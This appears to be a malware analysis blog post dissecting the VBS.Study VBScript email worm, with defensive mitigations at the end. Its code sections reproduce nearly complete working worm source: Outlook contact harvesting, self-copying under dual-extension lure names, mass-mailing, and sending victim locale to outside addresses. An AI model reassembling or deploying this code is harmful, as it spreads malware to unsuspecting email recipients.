# Dissecting VBS.Study: A Randomized Social‑Engineering Email Worm 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
VBS.Study is a compact Visual Basic Script (VBScript) worm from early 2001 that explores how themed subject lines and file names influence email‑borne propagation. The script automates Microsoft Outlook to iterate through address books and send individualized messages to every contact, attaching a freshly copied version of itself disguised with one of several enticing names (for example, a fake nude photo, an “Important” document, a joke about Bill Gates, or a Flash movie). This randomized lure strategy aims to maximize opens across diverse recipients.

Analyzing VBS.Study offers a snapshot of the era’s threat model: permissive scripting, weak attachment filtering, and widespread Outlook automation. The code demonstrates straightforward file operations, simple randomization, and direct interaction with the MAPI namespace, all without obfuscation. Understanding these mechanics helps defenders recognize similar social‑engineering patterns that persist today in macro malware and HTML smuggling, even as the platforms and defenses have evolved.

## Section 1 – Overview of the Malware 🐛
VBS.Study’s purpose is to mass‑mail itself using Microsoft Outlook, relying on social engineering rather than exploits. On execution, it gathers Outlook address lists and sends a separate email to each entry, crafting the subject, body, and attachment name based on a random choice from four templates. To prepare the payload, it copies its own script into the Windows directory (GetSpecialFolder(0)) under a lure‑specific file name—dual extensions like “.jpg.vbs” or “.exe.vbs” intended to look like legitimate content at a glance.

Typical targets are consumer or small‑office Windows systems in 2001 with Outlook and Windows Script Host enabled, where VBScript execution of email attachments faced fewer restrictions. The infection vector is a user double‑clicking the attached VBS file. The worm also sends a telemetry email to two hard‑coded addresses containing the system’s language setting (AcceptLanguage), presumably to study geographic distribution. There is no persistence, no destructive payload, and no complex evasion—just volume and varied lures to increase success.

## Section 2 – Source Code Analysis 🔬
The script is succinct: initialize objects, iterate contacts, randomize a lure, copy itself under a new name, attach and send, then send a brief telemetry email. Key components follow.

### Initialization and Address Book Enumeration
```vb
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws  = CreateObject("WScript.Shell")
Set O   = CreateObject("Outlook.application")
Set mapi = O.GetNameSpace("MAPI")
For Each AddList In mapi.AddressLists
  If AddList.AddressEntries.Count <> 0 Then
    For AddListCount = 1 To AddList.AddressEntries.Count
      Set AddListEntry = AddList.AddressEntries(AddListCount)
      Set msg = O.CreateItem(0)
      msg.To = AddListEntry.Address
      ' ... choose lure and send ...
    Next
  End If
Next
```
- Creates FileSystemObject and WScript.Shell for filesystem/registry access, and an Outlook.Application for email automation.
- Walks through all MAPI address lists and entries, creating one message per recipient. Unlike some worms that aggregate recipients in BCC, this one sends individual emails, which can avoid bulk‑send heuristics but produces more events per machine.

### Randomized Lures and Self‑Copy
```vb
Randomize
Num = Int((4*Rnd)+1)
Set c = fso.GetFile(WScript.ScriptFullName)
If num = 1 Then
  c.Copy fso.GetSpecialFolder(0) & "\MyGirlfriend_NUDE.jpg.vbs"
  msg.Subject = "Hi, how are you ?"
  msg.Body = "Hi, look at this nice Pic attached !"
  msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(0), "MyGirlfriend_NUDE.jpg.vbs")
ElseIf num = 2 Then
  c.Copy fso.GetSpecialFolder(0) & "\Winword.doc.vbs"
  msg.Subject = "Important Message"
  msg.Body = vbCrLf & "Here is that document you asked"
  msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(0), "Winword.doc.vbs")
ElseIf num = 3 Then
  c.Copy fso.GetSpecialFolder(0) & "\MONOPOLY.VBS"
  msg.Subject = "Bill Gates joke"
  msg.Body = "Bill Gates is guitly of monopoly. Here is the proof. :-)"
  msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(0), "MONOPOLY.VBS")
ElseIf num = 4 Then
  c.Copy fso.GetSpecialFolder(0) & "\CREATIVE.exe.vbs"
  msg.Subject = "A great Shockwave flash movie"
  msg.Body = "Check out this new flash movie that I download just now... It's Great."
  msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(0), "CREATIVE.exe.vbs")
End If
If msg.To <> "" Then msg.Send
```
- Uses VB’s `Randomize` + `Rnd` to choose one of four lure packages per recipient.
- For each case, copies itself to the Windows directory with a lure‑themed name and attaches that copy. Dual extensions (e.g., .jpg.vbs, .exe.vbs) are chosen to masquerade as benign content in environments where extensions were hidden by default.
- Sends the message if a non‑empty address exists; no throttling or error handling beyond defaults.

### Telemetry to Hard‑Coded Addresses
```vb
Set msg2 = O.CreateItem(0)
msg2.BCC = "Panda34@caramail.com; Pentasm99@aol.com"
PAYS = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage")
msg2.Subject = "VBS/Study arrivant de " & PAYS
msg2.Send
```
- Sends a second email in BCC to two addresses with the subject containing the system’s AcceptLanguage value. This provides a crude signal of the locale of infected hosts.
- No additional content or attachments are included; the worm does not collect more system data.

### Control Flow and Error Modes
- The worm assumes Outlook automation is available; there’s no explicit guard like `If O = "Outlook"`. On hosts without Outlook or with object access blocked, it will error out unless the host environment swallows COM errors.
- File copies target the Windows directory (`GetSpecialFolder(0)`), which typically requires standard privileges on Windows 9x/ME but can fail or prompt in later versions.
- Because a fresh file is copied per message, artifacts accumulate in the Windows directory until cleaned.

## Section 3 – Mitigation and Defense Strategies 🛡️
- Email gateway protections: Block or quarantine script attachments (.vbs, .vbe) and scan archives that may contain them. Apply content policies to flag dual‑extension names (e.g., “.jpg.vbs”, “.exe.vbs”) and subjects/bodies matching lure patterns shown above. Rate‑limit or alert on high‑volume individual sends via Outlook automation.
- Endpoint controls: Disable or restrict Windows Script Host (WSH) where not required; enforce application control (AppLocker/WDAC) to block `wscript.exe` and `cscript.exe` execution for standard users. Monitor for COM automation of Outlook by untrusted processes and for repeated `CreateItem(0)` events in short windows.
- File system telemetry: Alert on creation of the following in the Windows directory: `MyGirlfriend_NUDE.jpg.vbs`, `Winword.doc.vbs`, `MONOPOLY.VBS`, `CREATIVE.exe.vbs`. Monitor for a surge of small .vbs files in system folders tied to the user’s script host.
- User awareness: Train users to distrust unsolicited attachments, especially those with sensational subjects (“nude photo”, “important document”, “great movie”). Encourage previewing file extensions and disabling “hide extensions for known file types.”
- Outlook hardening: Enforce settings that prompt or block programmatic access (Object Model Guard) and disable legacy ActiveX/VBScript execution in email bodies. Prefer modern attachment detonation in sandbox prior to delivery.
- Threat hunting: Correlate processes spawning Outlook, high individual outbound mail counts, and .vbs file creation in %WinDir% within the same timeframe for robust behavioral detection.

## Conclusion
VBS.Study is a social‑engineering lab in script form: it varies subject lines, messages, and attachment names to test what entices recipients to click. Its mechanisms—self‑copying to the Windows directory, Outlook automation via MAPI, and individualized sends—are simple yet effective on permissive systems. The script avoids persistence and destructive actions, focusing instead on spread and basic telemetry about victim locales. For defenders, the lesson is that small scripts with familiar APIs can generate substantial email noise and exposure. Strong email filtering, endpoint scripting controls, and vigilance for dual‑extension lures remain essential to blunt such campaigns and their modern descendants.